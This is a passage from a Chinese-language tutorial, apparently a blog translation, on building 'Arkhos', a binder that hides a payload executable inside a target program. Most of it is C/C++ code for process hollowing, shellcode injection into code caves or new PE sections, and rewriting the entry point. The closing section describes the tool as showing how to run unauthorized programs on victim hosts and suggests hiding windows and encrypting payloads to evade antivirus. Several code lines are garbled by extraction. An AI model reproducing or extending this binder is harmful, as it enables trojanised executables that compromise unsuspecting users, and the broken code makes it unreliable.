**WriteProcessMemory** 将相关字节写入虚拟地址空间中。
    // allocate virtual space for process
    pfnVirtualAllocEx fnVirtualAllocEx = (pfnVirtualAllocEx)GetKernel32Function(0xE62E824D);
    LPVOID lpAddress = fnVirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, inh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // write headers into memory
    pfnWriteProcessMemory fnWriteProcessMemory = (pfnWriteProcessMemory)GetKernel32Function0x4F58972E);
    fnWriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, lpPayload, inh->OptionalHeader.SizeOfHeaders, NULL);
    // write each section into memory
    for (int i = 0; i FileHeader.NumberOfSections; i++) {
    // calculate section header of each section
    PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)lpPayload + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
    // write section data into memory
    fnWriteProcessMemory(pi.hProcess, (LPVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)lpPayload + pish->PointerToRawData), pish->SizeOfRawData, NULL);
    }
在恢复进程之前，我们需要修改线程的上下文，以便将指令指针（instruction
pointer）的起始位置设置为AddressOfEntryPoint。这个步骤完成后，我们就可以安全启动载荷进程。
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    pfnGetThreadContext fnGetThreadContext = (pfnGetThreadContext)GetKernel32Function(0x649EB9C1);
    fnGetThreadContext(pi.hThread, &ctx);
    // set starting address at virtual address: address of entry point
    ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
    pfnSetThreadContext fnSetThreadContext = (pfnSetThreadContext)GetKernel32Function(0x5688CBD8);
    fnSetThreadContext(pi.hThread, &ctx);
    // resume our suspended processes
    pfnResumeThread fnResumeThread = (pfnResumeThread)GetKernel32Function(0x3872BEB9);
    fnResumeThread(pi.hThread);
最后，我们需要执行原始程序，这一步非常简单：
    void(*oep)() = (void *)0x69696969;
    oep();
这里我预留了一个占位符（0x69696969），对应原始的入口点，以方便binder程序修改。
**五、开发Binder程序**
Binder程序的任务相对简单些，只涉及一些文件I/O以及少量PE文件修改操作，具体为：
1、读取目标可执行文件。
2、读取载荷可执行文件。
3、将shellcode注入到合适的section中。
4、将载荷数据附加到新的section中。
5、生成结合后的可执行文件。
**5.1 提取shellcode**
编译完shellcode可执行文件后，该文件应该会对应一个空的导入表，并且所有的data section中都不包含任何数据。所需的所有数据都位于.text
section中，所以提取这些字节并将其写入binder的源码中并不是件难事：
    this->shellcode = std::vector{ 0x50, 0x41, 0x59, 0x4C, ... };
**5.2 绑定（Binding）过程**
文件I/O代码十分简单，我会跳过这些代码，直接讨论绑定这两个程序的具体过程。存放shellcode的具体位置由两种情况来决定：如果.text
section的代码空间足够大，那么shellcode可以存放在这个位置，否则我们需要将其添加为一个新的section。由于这篇文章中我还没有演示如何追加一个新的section来存放数据，为了缩短文章篇幅，这里我只会演示如何使用.text
section来完成这个任务。我会在源码中介绍另一种方法。
在添加新section头部之前，我们需要检查是否有足够的空间来存放头部数据。我们需要将第一个section的原始地址与最后一个section尾部的原始地址相减，看结果是否大于等于新section头部大小。如果空间不够，那么绑定该文件的方法就不会那么简单。PE中有些字段用于描述section中的数据，只要理解参数含义，处理好对齐问题，那么创建一个新的section并不难。创建新的section后，我们可以将新头部填入新section的头部空间中，同时也要更新File
Header以及Optional Header的值。
    // check code cave size in .text section
    if (pishText->SizeOfRawData - pishText->Misc.VirtualSize >= this->shellcode.size()) {
        // insert shellcode into .text section
    } else {
    // else create new executable section
    // check space for new section header
    // get last IMAGE_SECTION_HEADER
    PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
    PIMAGE_SECTION_HEADER pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
    if (pishText->PointerToRawData - (DWORD)pishNew shellcode.size(), pinh->OptionalHeader.FileAlignment);
    ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
    ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
    ishNew.Misc.VirtualSize = this->shellcode.size();
    // fix headers' values
    pinh->FileHeader.NumberOfSections++;
    pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
    // manually calculate size of headers; unreliable
    pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);
    // append new section header
    ::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
    // append new section and copy to output
    output.insert(output.end(), target.begin(), target.end());
    output.insert(output.end(), this->shellcode.begin(), this->shellcode.end());
shellcode添加前后的示意图如下所示：
添加载荷section的过程基本相似，代码如下：
    // append new payload section
    // check space for new section header
    // get DOS header
    pidh = (PIMAGE_DOS_HEADER)output.data();
    // get NT headers
    pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);
    // find .text section
    pishText = IMAGE_FIRST_SECTION(pinh);
    // get last IMAGE_SECTION_HEADER
    pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
    pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
    if (pishText->PointerToRawData - (DWORD)pishNew OptionalHeader.FileAlignment);
    ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
    ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
    ishNew.Misc.VirtualSize = payload.size();
    // fix headers' values
    pinh->FileHeader.NumberOfSections++;
    pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
    pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->OptionalHeader.SizeOfHeaders + IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);
    // append new section header
    ::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
    // append new section and copy to output
    output.insert(output.end(), payload.begin(), payload.end());
载荷添加前后的示意图如下所示：
最后一步是更新Optional Header中的入口点地址，替换shellcode中的入口点占位符。
    // update address of entry point
    // redefine headers
    // get DOS header
    pidh = (PIMAGE_DOS_HEADER)output.data();
    // get NT headers
    pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);
    // find .text section
    pishText = IMAGE_FIRST_SECTION(pinh);
    // get .aids section (now is 2nd last)
    pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 2));
    PIMAGE_SECTION_HEADER pishAids = pishLast;
    // calculate new entry point
    DWORD dwNewEntryPoint = pishAids->VirtualAddress + SHELLCODE_START_OFFSET;
    pinh->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
    // update OEP in shellcode
    ::CopyMemory(output.data() + pishAids->PointerToRawData + SHELLCODE_START_OFFSET SHELLCODE_OEP_OFFSET, &dwOEP, sizeof(dwOEP));
**六、成果展示**
这里我会展示两个可执行文件绑定后的效果，我选择使用 **PEview.exe** 作为目标文件，使用 **putty.exe** 作为载荷文件。
**6.1 程序执行效果**
**6.2 查看section**
.aids section
.payload section
**七、总结**
这种方法不仅可以把简单shellcode注入可执行文件，弹出消息对话框，进一步扩展后可以完成更为复杂的操作，比如可以生成完全独立的可执行文件。只需要掌握PE文件的相关知识、基本的shellcode编写技巧以及Windows系统的一些内部工作原理，我们能发挥的空间（基本）不会受到任何限制。
**八、可改进的地方**
Arkhos只是一个PoC工程，用来演示恶意用户如何在受害者主机上执行未经授权的程序。我们可以做些改进，使这种技术的实际威胁程度大大提高，比如我们可以隐藏载荷的窗口，通过压缩及（或）加密方法来混淆载荷等。就目前而言，许多杀毒软件可以检测出这种组合式可执行程序，可参考[VirusTotal](https://www.virustotal.com/#/file/4f4088b27a590508b47fd34462ce785896691db5ff399b2d3f038d1a5f271855/detection)查看具体的检测结果。
我会在我的[GitLab](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Arkhos)上更新源代码及二进制文件。
希望本文能给某些读者带来灵感或启发。